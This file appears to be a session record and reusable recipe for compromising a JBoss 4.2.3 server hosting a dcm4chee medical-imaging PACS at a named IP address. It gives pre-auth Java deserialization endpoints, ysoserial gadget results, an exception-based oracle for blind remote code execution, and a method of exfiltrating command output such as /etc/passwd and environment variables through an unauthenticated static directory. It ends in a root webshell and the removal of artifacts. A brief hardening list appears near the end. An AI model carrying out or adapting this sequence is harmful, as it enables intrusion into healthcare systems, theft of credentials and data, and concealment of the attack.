# Verified Case Study — JBoss 4.2.3.GA + Java 7 (PACS/dcm4chee, 2026-09)

Target profile: nginx/1.19.6 front → JBoss 4.2.3.GA (JBossWeb 2.0.1.GA, Servlet 2.4, Java 7)
on 125.234.98.34:8088, running iDiVi 3.7 (Oviyam fork) over dcm4chee PACS. Root confirmed
(uid=0). No outbound network from the server (DNS/HTTP egress blocked). This file is the
session-exact recipe; SKILL.md holds the class-level knowledge.

## Stack facts confirmed

- Headers: `Server: nginx/1.19.6`, `X-Powered-By: Servlet 2.4; JBoss-4.2.3.GA (build:
  SVNTag=JBoss_4_2_3_GA date=200807181439)/JBossWeb-2.0.1.GA`.
- App name/version: "iDiVi 3.7" in login page + Bundle.js (`"Establish: BACHKHOA UNIVERSITY"`,
  `"Version: v3.7"`).
- Internal IPs leaked: 192.168.101.12 (DicomNodes.do, post-auth) and 192.168.4.253
  (post-exploit ifconfig). Hostname webbvhg. JBOSS_HOME=/usr/localbk/pacs.
- Java version proven by stack traces: `Method.java:597` and unpatched
  `sun.reflect.annotation.AnnotationInvocationHandler.readObject` ⇒ Java 7 family.
- commons-collections version on server: 3.2.0 (CC6's TiedMapEntry path ran, next
  introduction of 3.2.1-only classes is what failed — deser worked, post-deser cast died).

## Endpoint map (pre-auth)

| Path | Result | Meaning |
|---|---|---|
| `GET /invoker/readonly` | 500 + `java.io.EOFException … ObjectInputStream.readStreamHeader … ReadOnlyAccessFilter.doFilter(ReadOnlyAccessFilter.java:102)` | Deserialization reachable, EMPTY body, no auth. Best first probe |
| `GET /invoker/JMXInvokerServlet` | 200, `Content-Type: application/x-java-serialized-object` (returns a serialized MarshalledValue) | Deser entry, pre-auth |
| `GET /invoker/EJBInvokerServlet` | 200, same content-type | Deser entry, pre-auth |
| `POST gadget → /invoker/readonly` | 500 with `ClassCastException Integer→Set` or `FunctorException` (see oracle table) | Gadget chain live |
| `HEAD /web-console/Invoker` | 200 with zero body (bypass probe; full auth needed for MBean ops) | Auth-bypass probe |
| `/jmx-console/` | 404 through nginx first pass; reachable via script --force (auth still enforced on MBean writes) | Blocked-ish |
| `/admin-console/` | not present | — |
| `/web-console/` (GET) | 401, realm "JBoss WEB Console", admin/admin rejected | Basic auth over HTTP (base64, decryptable) |

## Gadget matrix actually tested on Java 7 target

| ysoserial chain | Result | Root cause |
|---|---|---|
| CommonsCollections1 | LIVE (oracle distinct for valid/invalid cmds) | AnnotationInvocationHandler + LazyMap + InvokerTransformer present |
| CommonsCollections6 | Deserializes (exec(String) fires during readObject) then ClassCastException HashSet→MarshalledInvocation | commons-collections 3.2.0 too old for the pieces CC6 touches post-deser |
| CommonsCollections3 | FunctorException InstantiateTransformer constructor error | TemplatesImpl bytecode/JDK mismatch (payload built for Java 21 semantics, target Java 7) |
| CommonsBeanutils1 | ClassNotFoundException BeanComparator | commons-beanutils not on classpath |
| Jdk7u21 | ClassCastException LinkedHashSet→MarshalledInvocation | deser OK, cast to MarshalledInvocation (framework expectation) failed |

## Exception oracle table (exact strings from this target)

- Valid command (`touch /tmp/a`, `id`, `python -c "..."`, `/bin/sh -c "echo hi>/tmp/f"`):
  `java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set`
  (path: `com.sun.proxy.$Proxy281.entrySet` →
  `sun.reflect.annotation.AnnotationInvocationHandler.readObject:328`).
- Invalid command (`/nonexistent_cmd`, `python3 -c` when only python2 exists):
  `org.apache.commons.collections.FunctorException: InvokerTransformer: The method 'exec' on
  'class java.lang.Runtime' threw an exception`.
- exec(String) command WITH space/redirect/pipe (echo ... > file):
  FunctorException (never reaches shell semantics).
- ClassCastException Integer→Set ⇒ exec() succeeded ⇒ RCE oracle. Live blind RCE confirmed.

## Sleep/timing never confirmed RCE on this target

Tried `Runtime.exec("sleep 70")` → response time identical (~0.03s). Because the gadget
spawns the sleep process and returns Process immediately. Confirmed multiple times.
Also checked with a new internal listener (no `nc`, no `curl`) — no callbacks. DNS/HTTP egress
completely firewalled (Burp Collaborator never saw a hit).

## exfil trick — write into the app's own static dir

Root cause this works: some web-root subpaths are served WITHOUT auth by the fronting nginx
even while the app under `/` enforces j_security_check.

Verified concrete steps this session:

1. Find a static asset path reachable without logging in that maps to a directory on disk.
   Use `find / -type f -name 'favicon.png' -path '*/images/*'` (or any asset the landing page
   includes, e.g. logo png, css).
2. From the exception oracle, confirm the path is writeable at runtime by the JVM.
   Dump directory listing with `ls -la <app>/images/ > <app>/images/ls.txt` then
   `curl http://target:8088/images/ls.txt`.
3. Exfil arbitrary command output through the same trick:
   `id > <images>/r.txt`, `env > <images>/env.txt`, `cat /etc/passwd > <images>/passwd.txt`.
4. Files wind up downloadable over normal HTTP on port 8088 — no extra tunnel needed.
   Example observed: `cat /images/r.txt` →
   `uid=0(root) gid=0(root) groups=0(root)`.

## Full verified exploitation sequence (2026-09)

1. Probe `/invoker/readonly` with empty GET → 500 EOFException means deser-everything.
2. Build CC6 ysoserial payload on Kali; different exception for valid vs invalid command ⇒ blind RCE.
3. exec(String) blocks redirects/pipes/quotes → craft custom exec(String[]) chain
   (`{"/bin/sh","-c", cmd}`) — payload ≈1438 bytes, magic `aced 0005`, oracle still works.
4. Locate web root from static assets (`find / ... favicon.png`).
5. Write files into images/ path served without auth → confirm uid=0(root).
6. Re-iterate: JBOSS_HOME, deploy layout, further WAR staging (http-invoker.sar / invoker.war).
7. End with root shell via webshell; then clean artifacts.

## Handling tool "deployed successfully" false positives

JexBoss sometimes prints "deployed successfully" by checking HTTP status of
`/jexinv4/jexinv4.jsp` — but that path can return the app's normal login page (HTTP 200) even
when nothing was deployed (DeploymentFileRepository store() hit SecurityException due to
jmx-console auth, or invoke failed silently). Any tool-based success claim must be verified
through the exception oracle or an artifact you actually control (e.g. write an HTML file
into static dir and read it back).

## Endpoint hardening notes (for report)

- Remove or disable http-invoker.sar / invoker.war (rejects /invoker/* traffic entirely).
- Add explicit `<security-constraint>` on any deploy dir left over (e.g. `/deploy/*`).
- Enforce auth on /web-console/ and /jmx-console/ management endpoints; otherwise broute-block.
- JEP 290-style ObjectInputFilter / `jdk.serialFilter=` allow-list at JVM level.
- Upgrade off legacy JBoss 4.x/5.x; JBossWeb 2.0.1.GA (Tomcat 6 fork) has no supported path.

## Secondary artifacts this session produced

- `payload.bin` (CC6 touch /tmp/test, 1288 bytes) at `~/Tools/ysoserial-java/` — kept as an
  example of a validated classifier payload for the oracle.
- CustomCC1.java in-memory compile path (needs no per-target recompile; swap command string).
- Exception-differential test harness embedded in generate script (see prior skill file).
